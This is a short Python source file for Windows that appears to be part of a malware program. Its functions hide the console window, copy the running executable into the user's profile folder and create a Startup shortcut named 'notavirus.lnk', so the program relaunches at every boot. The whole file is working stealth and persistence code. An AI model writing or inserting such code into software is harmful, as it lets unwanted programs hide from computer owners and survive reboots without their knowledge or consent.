import os
import win32com.client
import win32gui, win32con

import shutil

# Hides command-line window
def hide():
    console = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(console, win32con.SW_HIDE)

# Copies the executable to current user's folder
def cloneExe(NAME):
    curr = os.getcwd() + fr"\{NAME}.exe"
    to = ""
    if os.path.exists(curr):
        to = "C:\\Users\\" + os.getlogin() + fr"\{NAME}.exe"
        shutil.copyfile(curr, to)
    return to

# Adds shortcut to startup, causing program to run on computer bootup
def addStartup(to):
    startup = "C:\\Users\\"+ os.getlogin() + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    path = os.path.join(startup, 'notavirus.lnk')
    if not os.path.exists(path) and to != "":
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(path)
        shortcut.Targetpath = to
        shortcut.IconLocation = to
        shortcut.save()
        return False
    else:
        return True

